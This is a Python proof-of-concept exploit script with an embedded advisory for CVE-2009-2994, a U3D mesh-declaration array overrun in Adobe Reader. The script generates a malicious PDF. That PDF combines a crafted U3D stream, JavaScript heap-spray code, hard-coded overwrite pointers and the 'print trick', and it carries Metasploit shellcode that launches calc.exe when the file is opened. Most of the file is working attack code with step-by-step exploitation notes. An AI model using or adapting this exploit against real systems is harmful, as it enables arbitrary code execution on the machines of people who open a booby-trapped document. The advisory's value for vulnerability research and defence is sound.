##Copyright (c) 2009, Felipe Andres Manzano <felipe.andres.manzano@gmail.com>
##All rights reserved.
##
##Redistribution and use in source and binary forms, with or without
##modification, are permitted provided that the following conditions are met:
##    * Redistributions of source code must retain the above copyright
##      notice, this list of conditions and the following disclaimer.
##    * Redistributions in binary form must reproduce the above copyright
##      notice, this list of conditions and the following disclaimer in the
##      documentation and/or other materials provided with the distribution.
##    * Neither the name of the Felipe Andres Manzano nor the
##      names of its contributors may be used to endorse or promote products
##      derived from this software without specific prior written permission.
##
##THIS SOFTWARE IS PROVIDED BY Felipe Andres Manzano ''AS IS'' AND ANY
##EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
##WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
##DISCLAIMED. IN NO EVENT SHALL <copyright holder> BE LIABLE FOR ANY
##DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
##(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
##LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
##ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
##(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
##SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

##########################################################################
####   Felipe Andres Manzano * felipe.andres.manzano@gmail.com        ####
##########################################################################
_doc_ = '''
Title: U3D CLODProgressiveMeshDeclaration initialization array overrun.
Product: Adobe Acrobat Reader (also Right Hemisphere Deep Exploration and others)
Version: 7.x, 8.x, 9.x
Product Homepage: www.adobe.com 
Binary affected: */cygdrive/c/Program Files/Adobe/Reader 9.0/Reader/plug_ins3d/3difr.x3d
Binary Version: Adobe Reader 9.1.3
Binary MD5: 3c9b7a410047cbf5edcd229b0f0f62a5 
CVE: CVE-2009-2994

Configuration Requirements
-----------------------------------------
Default

Vulnerability Requirements
-----------------------------------------
None

Vulnerability Description
-----------------------------------------
Universal 3D (U3D) is a compressed file format standard for 3D computer
graphics data. 
Right Hemisphere has plugged funtionality for managing this format in a
bunch of their products. Also since version 7 Acrobat Reader is shipped
with a default plugin that supports this format as a form of interactive
annotation for PDFs.
Apparently, Adobe's provider of this technology is RH...

 grep -R "Right Hemisphere" /opt/Adobe/
 Binary file /opt/Adobe/Reader8/Reader/intellinux/plug_ins3d/3difr.x3d matches


When U3D CLODMeshDeclaration (blocktype: 0xFFFFFF31) is parsed by Adobe
Acrobat Reader, the U3D plugin will read two unvalidated 32 bit
integers, N and M. N is the length of an array of 20 bytes long
structures. But, M structures of that fresh array will be processed
taking uninitialized pointers from memory and writing arbitrary values
to the memory pointed by them.

More preciselly, in the U3D file the CLODMeshDeclaration box the
*positionCount* field (see #9.6.1.1.3.3) defines the length of the array
and the field *minimalResolution* determines how much of the array is
procesed. As stated before, if *minimalResolution*  happens to be bigger than
*positionCount* then uninitialized off limits structures will be procesed. 



Explotation:
============
        *** Standalone and activeX reader tested in XPSP3 ***

As we control the size of the over-used array and how much we'll overuse
it, an outline of the exploitation may have this form...

- Choose a convenient not heavily used size for the array like 6500x20
- Spray the mem with a lot of 6500x20 controled chunks
- Free one of those in the middle so we have some amount of confidence 
  that the freed chunk will be followed by controled data.
- Control the data following the array that will be overrunned and the 
  dereferenced structure.
- Use the normal program behavior that takes pointers and data from the
  now controled structure and make the write4bytes primitive.
- Use the write4bytes primitive and some more spray to do the print trick(tm)

Much more detailed doc inlined in the PoC...

Note:
Same bug was confirmed in RH Deep Exploration 5.5 (CAD Edition).
Other products from the firm may be affected. Notably this may affect
their free 3d viewer that enable the publishing of embedded 3d models
into MS Office products.

REFERENCES
==========
http://en.wikipedia.org/wiki/Universal_3D
http://www.ecma-international.org/publications/files/ECMA-ST/ECMA-363%204th%20edition.pdf
http://www.adobe.com/devnet/acrobat3d/pdfs/U3DElements.pdf  
http://www.ucon-conference.org/materials/2009/HackingPDFReaders-uCon-2009.pdf

Vulnerability WorkAround (if possible)
-----------------------------------------
For adobe bug.. delete the plugin.


'''

import os
import zlib
import sys
import struct

#For constructing a minimal pdf file
class PDFObject:
    def __init__(self):
        self.n=None
        self.v=None

    def __str__(self):
        raise "Fail"

class PDFStream(PDFObject):
    def __init__(self, dict,stream):
        PDFObject.__init__(self)
        dict.add('Length', len(stream))
        self.dict=dict
        self.stream=stream

    def __str__(self):
        s=""
        s+=self.dict.__str__()
        s+="\nstream\n"
        s+=self.stream
        s+="\nendstream"
        return s

class PDFArray(PDFObject):
    def __init__(self,s):
        PDFObject.__init__(self)
        self.s=s
    def __str__(self):
        return "[%s]"%(" ".join([ o.__str__() for o in self.s]))


class PDFDict(PDFObject):
    def __init__(self):
        PDFObject.__init__(self)
        self.dict = []    

    def add(self,name,obj):
        self.dict.append((name,obj))

    def __str__(self):
        s="<<"
        for name,obj in self.dict:
            s+="/%s %s "%(name,obj)
        s+=">>"
        return s    

class PDFName(PDFObject):
    def __init__(self,s):
        PDFObject.__init__(self)
        self.s=s
    def __str__(self):
        return "/%s"%self.s

class PDFString(PDFObject):
    def __init__(self,s):
        PDFObject.__init__(self)
        self.s=s

    def __str__(self):
        return "(%s)"%self.s

class PDFHexString(PDFObject):
    def __init__(self,s):
        PDFObject.__init__(self)
        self.s=s

    def __str__(self):
        return "<" + "".join(["%02x"%ord(c) for c in self.s]) + ">"

class PDFOctalString(PDFObject):
    def __init__(self,s):
        PDFObject.__init__(self)
        self.s="".join(["\\%03o"%ord(c) for c in s])

    def __str__(self):
        return "(%s)"%self.s

class PDFNum(PDFObject):
    def __init__(self,s):
        PDFObject.__init__(self)
        self.s=s

    def __str__(self):
        return "%s"%self.s

class PDFRef(PDFObject):
    def __init__(self,obj):
        PDFObject.__init__(self)
        self.obj=[obj]
    def __str__(self):
        return "%d %d R"%(self.obj[0].n,self.obj[0].v)

class PDFNull(PDFObject):
    def __init__(self):
        PDFObject.__init__(self)

    def __str__(self):
        return "null"


class PDFDoc():
    def __init__(self):
        self.objs=[]

    def setRoot(self,root):
        self.root=root

    def _add(self,obj):
        obj.v=0
        obj.n=1+len(self.objs)
        self.objs.append(obj)

    def add(self,obj):
        if type(obj) != type([]):
            self._add(obj);
        else:
            for o in obj:
                self._add(o)

    def _header(self):
        return "%PDF-1.7\n"

    def __str__(self):
        doc1 = self._header()
        xref = {}
        for obj in self.objs:
            xref[obj.n] = len(doc1)
            doc1+="%d %d obj\n"%(obj.n,obj.v)
            doc1+=obj.__str__()
            doc1+="\nendobj\n" 
        posxref=len(doc1)
        doc1+="xref\n"
        doc1+="0 %d\n"%(len(self.objs)+1)
        doc1+="0000000000 65535 f\n"
        for xr in xref.keys():
            doc1+= "%010d %05d n\n"%(xref[xr],0)
        doc1+="trailer\n"
        trailer =  PDFDict()
        trailer.add("Size",len(self.objs))
        trailer.add("Root",PDFRef(self.root))
        doc1+=trailer.__str__()
        doc1+="\nstartxref\n%d\n"%posxref
        doc1+="%%EOF\n\n"

        return doc1

def getU3D(size):
    #Bug marked u3d file
    u3d =  ""
    u3d += "536f727279206d616e2c206a757374206b696c6c696e6720736f6d6520736b696469657300"
    u3d += "55334400180000000000000000010000000000002400000064010000000000006a00000014"
    u3d += "ffffffe40000000000000007005468654d65736801000000000000005050500100000031ff"
    u3d += "ffff710000004b00000007005468654d657368000000000000000001000000595858580400"
    u3d += "0000000000000000000000000000010000000000000000000000000000005b5858585c5858"
    u3d += "582c0100002c0100002c010000000000000000000000000000000000000000000000000000"        
    u3d += "000000000000000000000000505050010000000600617574686f7201000000370000004665"
    u3d += "6c69706520416e64726573204d616e7a616e6f203c66656c6970652e616e647265732e6d61"
    u3d += "6e7a616e6f40676d61696c2e636f6d3e503cffffff410000000000000007005468654d6573"
    u3d += "68000000000000000000000000000000000100000001000000010000000100000001000000"
    u3d += "0100000001000000010000000100000001000000505050"

    u3dstr = u3d.decode('hex')
    #see 9.6.1.1.4 CLOD Description
    u3dstr = u3dstr.replace(struct.pack("<L",0x58585859),struct.pack("<L",size))   #9.6.1.1.3.3 U32: Position Count
    u3dstr = u3dstr.replace(struct.pack("<L",0x5858585b),struct.pack("<L",size+2)) #minimalResolution
    u3dstr = u3dstr.replace(struct.pack("<L",0x5858585c),struct.pack("<L",size+3)) #finalMaximumResolution, this just need to be bigger than the last one.
    return u3dstr


##############################MAIN###################################
class PDFU3DclodMESHDeclarationResolutionsBug:
    #Escaping the escaping hell
    def _toJS(self, s):
        if type(s) in set([long, int]) :
            s = struct.pack("<L",s) 
        if len(s) % 2 != 0:
            raise "Err! Should be even number of chars"
        r = ""
        for i in range (0,len(s)/2):
            r += "%u"+ "".join([ "%02x%02x"%(ord(s[i*2+1]),ord(s[i*2]))])
        return "unescape(\""+r+"\")"

    def _generateJS(self):
        js = '''
     function prepareHoles(slide_size){
            var size = 1000;
            var x = new Array(size);
            var hole = %%hole%%;
            /*
             * TODO: to gain 0.0000000001% more reliability pad it with
             * a far jump to shellcode instead of PPPPP..
             */
            var pad = unescape("%u5858");
            while (pad.length <= slide_size/2 - hole.length) 
                        pad += pad;

            for (i=0; i < size; i+=1) {
                    id = ""+i;
                    x[i]=hole + pad.substring(0,slide_size/2-hole.length);
            }

            /* Intermitently free half of the array & garbageCollect */
            for (j=0;j<100;j++)
                    for (i=size/2; i < size-2; i+=2){
                            x[i]=null;
                        x[i]=pad.substring(0,0x10000/2 )+"A";
                        x[i]=null;
                }
            return x;
        }
     function prepareMemory(size){
            var mini_slide_size = 0x1000;
            var slide_size = 0x100000;
            var x = new Array(size);


            var pad = unescape("%ucccc");
            while (pad.length <= 32 ) 
                pad += pad;

            /* Bunch of nops */
            var nops = unescape("%u9090");
            while (nops.length <= mini_slide_size/2 - nops.length) 
                nops += nops;

            var shellcode = %%shellcode%%;
            var pointers = %%pointers%%;

            /*
             * TODO: to gain 0.0000000001% more reliability add a short jump 
             * at the end of the firsts nops to jump over the pointers.
             * Note that the first nops of the big (0x10000) chunk will be 
             * cuted off
             *
             * mini_slide_size len minichunk. (Always 0x1000 aligned) 
             */
            var chunk = nops.substring(0,32/2) + 
                        pointers + 
                        nops.substring(0,mini_slide_size/2-pointers.length 
                                                    - shellcode.length - 32) +
                        shellcode + 
                        pad.substring(0,32/2);
            chunk=chunk.substring(0,mini_slide_size/2);
            /*
             * slide_size len minichunk. (Always 0x1000 aligned) 
             */
            while (chunk.length <= slide_size/2) 
                chunk += chunk;

            for (i=0; i < size; i+=1) {
                        /* Debugging chunk id */
                        id = ""+i;
                        /* we cut the first bytes for better aligment */
                        x[i]=chunk.substring(16,slide_size/2 -32-id.length)+id;
                        }; 
        return x;
        }

        /*
         * Fill the memory with all needed chunks
         */
        var mem = prepareMemory(200);
        /*
         * Prepare the interleaved holes 
         */
        var holes = prepareHoles(6500);
        /* Advance to the last page */
        for (i=0;i<2;i++) 
            this.pageNum++;

        '''
        ## PREPAREHOLES:
        ## We will construct 6500*20 bytes long chunks starting like this 
        ## |0         |6   |8       |C        |24                    |size
        ## |00000...  |0100|20100190|0000...  |    ......pad......   |
        ##                 \      \ 
        ##                 \      \ -Pointer: to controlled data
        ##                   \ -Flag: must be 1
        ## -Adobe will handle this ragged structure if the Flag is on.
        ## -Adobe will get 'what to write where' from the memory pointed 
        ##  by our supplied Pointer.   
        ##
        ## then allocate a bunch of those ..
        ## .. | chunk | chunk | chunk | chunck | chunk | chunck | chunck | ..
        ##    |XXXXXXX|XXXXXXX|XXXXXXX|XXXXXXXX|XXXXXXX|XXXXXXXX|XXXXXXXX|
        ##
        ## and then free some of them...
        ## .. | chunk | free  | chunk |  free  | chunk |  free  | chunck | ..
        ##    |XXXXXXX|       |XXXXXXX|        |XXXXXXX|        |XXXXXXXX|
        ##
        ## This way controlling when the next 6500*20 malloc will be 
        ## followed with. We freed more than one hole so it became tolerant
        ## to some degree of malloc/free trace noise.
        ## Note the 6500 is arbitrary it should be a fairly unused chunk size 
        ## not big enough to cause a different type of allocation.
        ## Also as we don't need to reference it from anywhere we don't care 
        ## where this hole layout is placed in memory.
        js = js.replace("%%hole%%",
                        self._toJS("\x00"*6+
                                    struct.pack("<H",1)+
                                    struct.pack("<L",0x09011020)+
                                    "\x00"*24))
        ## PREPAREMEMORY:
        ## In the next technique we make a big-chunk of 0x10000 bytes 
        ## repeating a 0x1000 bytes long mini-chunk of controled data. 
        ## Big-chunks are always allocated aligned to 0x1000. And if we 
        ## allocate a fair amount of big-chuncks (XPSPx) we'll be confident 
        ## Any 0x1000 aligned 0x1000 bytes from 0x09000000 to 0x0a000000
        ## will have our mini chunk
        ##
        ## A mini-chunk will have this look
        ## 
        ## |0         |10          |54         |?           |0xff0  |0x1000
        ## |00000...  |  POINTERS  |    nops   | shellcode  |  pad  |
        ##
        ## So we control what is in 0x09XXXXXX. shellcode will be at 0x09XXX054+
        ## But we use 0x09011064.
        ## POINTERS looks like this:
        ## ...
        js = js.replace("%%pointers%%",
                        self._toJS(struct.pack("<L",0x0)+
                                   ## where to write
                                   struct.pack("<L",0x7c49fb34/4)+
                                   ## must be greater tan 5 and less than x for getting us where we want
                                   struct.pack("<L",0x6)+
                                   ## what to write
                                   struct.pack("<L",0x09011030)+
                                   ## autopointer for print magic(tm)
                                   struct.pack("<L",0x09011034)+
                                   ## function pointers for print magic(tm) 
                                   ## pointing to our shellcode
                                   struct.pack("<L",0x09011064)*12))
        js = js.replace("%%shellcode%%",self._toJS(self.shellcode) +
                                        "\xcc" * (len(self.shellcode)%2))
        return js

    def mkDummy(self,pages,txt="PWNED!", js=""):
        #font
        font= PDFDict()
        font.add("Subtype", PDFName("Type1"))
        font.add("Name", PDFName("F1"))
        font.add("BaseFont", PDFName("Helvetica"))

        fontname = PDFDict()
        fontname.add("F1",font)
        #resources
        resources = PDFDict()
        resources.add("Font",fontname)

        #contents
        contents= PDFStream(PDFDict(), '''BT /F1 24 Tf 240 700 Td (%s) Tj ET'''%txt)

        #The pdf page
        page = PDFDict()
        page.add('Type', '/Page')
        page.add('Parent', PDFRef(pages))
        page.add('Resources', resources)
        page.add('Contents', PDFRef(contents))

        #JavaScriptSeek
        if len(js) != 0:
            actionJSSeek = PDFDict()
            actionJSSeek.add("S", PDFName("JavaScript"))
            actionJSSeek.add("JS", PDFHexString(js))
            self.doc.add(actionJSSeek)
            page.add('AA', '<< /O '+PDFRef(actionJSSeek).__str__()+'>>')

        self.doc.add(contents)
        self.doc.add(page)

        return PDFRef(page)

    def mkCrash(self,pages,txt="PWNED!", js=""):
        #font
        font= PDFDict()
        font.add("Subtype", PDFName("Type1"))
        font.add("Name", PDFName("F1"))
        font.add("BaseFont", PDFName("Helvetica"))

        fontname = PDFDict()
        fontname.add("F1",font)
        #resources
        resources = PDFDict()
        resources.add("Font",fontname)

        #contents
        contents= PDFStream(PDFDict(), '''BT /F1 24 Tf 240 700 Td (%s) Tj ET'''%txt)

        #The pdf page
        page = PDFDict()
        page.add('Type', '/Page')
        page.add('Parent', PDFRef(pages))
        page.add('Resources', resources)
        page.add('Contents', PDFRef(contents))

        #JavaScriptSeek
        if len(js) != 0:
            actionJSSeek = PDFDict()
            actionJSSeek.add("S", PDFName("JavaScript"))
            actionJSSeek.add("JS", PDFHexString(js))
            self.doc.add(actionJSSeek)
            page.add('AA', '<< /O '+PDFRef(actionJSSeek).__str__()+'>>')

        str3d = PDFDict()
        str3d.add("Type","/3D")
        str3d.add("Subtype","/U3D")

        str3d = PDFStream(str3d, getU3D(6500/20))

        annot3d = PDFDict()
        annot3d.add("Type",PDFName("Annot"))
        annot3d.add("Subtype","/3D")
        annot3d.add("Contents", "(a 3d model)")
        annot3d.add("3DI", "false")
        annot3d.add("3DA", "<< /A /PO /DIS /I >>")
        annot3d.add('Rect', PDFArray([ 0, 0, 640, 480]))
        annot3d.add("3DD",PDFRef(str3d))
        annot3d.add("F", "7")
 
        page.add('Annots', PDFArray([PDFRef(annot3d)]))

        self.doc.add([str3d,annot3d,contents,page])
        return PDFRef(page)


    def __init__(self,scode):
        #shellcode
        self.shellcode=scode

        self.doc= PDFDoc()
        branding = PDFDict()
        branding.add("Author", PDFString("Felipe Andres Manzano"))
        branding.add("email", PDFString("felipe.andres.manzano@gmail.com"))
        branding.add("twitter", PDFString("http://twitter.com/feliam"))
        branding.add("web", PDFString("felipe.andres.manzano.googlepages.com"))
        self.doc.add(branding)

        #outline
        outlines = PDFDict()
        outlines.add("Type", PDFName("Outlines"))
        outlines.add("Count",0)

        #pages
        pages = PDFDict()
        pages.add("Type", PDFName("Pages"))

        #catalog
        catalog = PDFDict()
        catalog.add("Type", PDFName("Catalog"))
        catalog.add("Outlines", PDFRef(outlines))
        catalog.add("Pages", PDFRef(pages))


        #lets add those to doc just for showing up the Ref object.
        self.doc.add([catalog,outlines,pages])

        #crashing U3d annotated page
        page = self.mkCrash(pages, js= '''this.print({bUI: true, bSilent: false, bShrinkToFit: false}); ''') #js for the print trick(tm)
        #dummy Page
        dummy1 = self.mkDummy(pages, js=self._generateJS())
        dummy2 = self.mkDummy(pages)

        pages.add('Count', PDFNum(3))
        pages.add('Kids',PDFArray([dummy1,dummy2,page]))

        #Set the pdf root
        self.doc.setRoot(catalog)


    def render(self):
        #render it
        return self.doc.__str__()

# win32_exec -  EXITFUNC=process CMD=calc.exe Size=164 Encoder=PexFnstenvSub http://metasploit.com
w32Scode = "\x31\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x88"
w32Scode += "\x06\x28\x26\x83\xeb\xfc\xe2\xf4\x74\xee\x6c\x26\x88\x06\xa3\x63"
w32Scode += "\xb4\x8d\x54\x23\xf0\x07\xc7\xad\xc7\x1e\xa3\x79\xa8\x07\xc3\x6f"
w32Scode += "\x03\x32\xa3\x27\x66\x37\xe8\xbf\x24\x82\xe8\x52\x8f\xc7\xe2\x2b"
w32Scode += "\x89\xc4\xc3\xd2\xb3\x52\x0c\x22\xfd\xe3\xa3\x79\xac\x07\xc3\x40"
w32Scode += "\x03\x0a\x63\xad\xd7\x1a\x29\xcd\x03\x1a\xa3\x27\x63\x8f\x74\x02"
w32Scode += "\x8c\xc5\x19\xe6\xec\x8d\x68\x16\x0d\xc6\x50\x2a\x03\x46\x24\xad"
w32Scode += "\xf8\x1a\x85\xad\xe0\x0e\xc3\x2f\x03\x86\x98\x26\x88\x06\xa3\x4e"
w32Scode += "\xb4\x59\x19\xd0\xe8\x50\xa1\xde\x0b\xc6\x53\x76\xe0\x78\xf0\xc4"
w32Scode += "\xfb\x6e\xb0\xd8\x02\x08\x7f\xd9\x6f\x65\x49\x4a\xeb\x28\x4d\x5e"
w32Scode += "\xed\x06\x28\x26"

def getPDF():
    fuzz = PDFU3DclodMESHDeclarationResolutionsBug(w32Scode)
    return fuzz.render()

##Main

if __name__=="__main__":
    print _doc_
    if len(sys.argv) != 2:
        print "Usage:\n\t"+sys.argv[0]+" filename.pdf\n"
    else:
        file(sys.argv[1],"w").write(getPDF())
##
##
## unrelated salut! to: Alfr3d, Juliano, JCF, David Batanero 
##
